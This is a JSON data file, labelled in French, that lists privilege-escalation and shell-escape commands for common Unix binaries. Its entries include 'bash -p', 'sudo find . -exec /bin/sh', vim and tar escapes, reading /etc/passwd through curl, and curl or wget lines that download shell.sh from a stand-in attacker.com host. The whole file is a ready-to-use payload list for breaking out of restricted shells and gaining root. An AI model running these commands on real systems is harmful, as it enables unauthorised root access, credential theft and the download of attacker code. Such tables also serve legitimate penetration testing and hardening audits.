{
  "bash":    {"functions": [{"type": "shell",      "description": "Shell non restreint", "commands": "bash -p"},
                             {"type": "sudo",       "description": "Élévation sudo", "commands": "sudo bash"},
                             {"type": "file-read",  "description": "Lecture fichier", "commands": "bash < /etc/passwd"}]},
  "python3": {"functions": [{"type": "shell",      "description": "Spawn shell", "commands": "python3 -c 'import os; os.system(\"/bin/sh\")'"},
                             {"type": "sudo",       "description": "Élévation sudo", "commands": "sudo python3 -c 'import os; os.system(\"/bin/sh\")'"}]},
  "find":    {"functions": [{"type": "shell",      "description": "Exec via find", "commands": "find . -exec /bin/sh \\; -quit"},
                             {"type": "sudo",       "description": "Élévation sudo", "commands": "sudo find . -exec /bin/sh \\; -quit"}]},
  "vim":     {"functions": [{"type": "shell",      "description": "Shell depuis vim", "commands": "vim -c ':!/bin/sh'"},
                             {"type": "sudo",       "description": "Élévation sudo", "commands": "sudo vim -c ':!/bin/sh'"}]},
  "nmap":    {"functions": [{"type": "shell",      "description": "Mode interactif nmap", "commands": "nmap --interactive\nnmap> !sh"},
                             {"type": "sudo",       "description": "Élévation sudo", "commands": "sudo nmap --interactive\nnmap> !sh"}]},
  "perl":    {"functions": [{"type": "shell",      "description": "Spawn shell perl", "commands": "perl -e 'exec \"/bin/sh\";'"},
                             {"type": "sudo",       "description": "Élévation sudo", "commands": "sudo perl -e 'exec \"/bin/sh\";'"}]},
  "ruby":    {"functions": [{"type": "shell",      "description": "Spawn shell ruby", "commands": "ruby -e 'exec \"/bin/sh\"'"},
                             {"type": "sudo",       "description": "Élévation sudo", "commands": "sudo ruby -e 'exec \"/bin/sh\"'"}]},
  "lua":     {"functions": [{"type": "shell",      "description": "Spawn shell lua", "commands": "lua -e 'os.execute(\"/bin/sh\")'"},
                             {"type": "sudo",       "description": "Élévation sudo", "commands": "sudo lua -e 'os.execute(\"/bin/sh\")'"}]},
  "awk":     {"functions": [{"type": "shell",      "description": "Spawn shell awk", "commands": "awk 'BEGIN {system(\"/bin/sh\")}'"},
                             {"type": "sudo",       "description": "Élévation sudo", "commands": "sudo awk 'BEGIN {system(\"/bin/sh\")}'"}]},
  "less":    {"functions": [{"type": "shell",      "description": "Shell depuis pager", "commands": "less /etc/hosts\n!/bin/sh"},
                             {"type": "sudo",       "description": "Élévation sudo", "commands": "sudo less /etc/hosts\n!/bin/sh"}]},
  "more":    {"functions": [{"type": "shell",      "description": "Shell depuis more", "commands": "more /etc/hosts\n!/bin/sh"}]},
  "man":     {"functions": [{"type": "shell",      "description": "Shell depuis man", "commands": "man man\n!/bin/sh"},
                             {"type": "sudo",       "description": "Élévation sudo", "commands": "sudo man man\n!/bin/sh"}]},
  "tar":     {"functions": [{"type": "shell",      "description": "Exec via checkpoint tar", "commands": "tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"},
                             {"type": "sudo",       "description": "Élévation sudo", "commands": "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"}]},
  "curl":    {"functions": [{"type": "file-read",  "description": "Lecture fichier local", "commands": "curl file:///etc/passwd"},
                             {"type": "file-write", "description": "Téléchargement fichier", "commands": "curl http://attacker.com/shell.sh -o /tmp/shell.sh"}]},
  "wget":    {"functions": [{"type": "file-write", "description": "Téléchargement fichier", "commands": "wget http://attacker.com/shell.sh -O /tmp/shell.sh"}]}
}
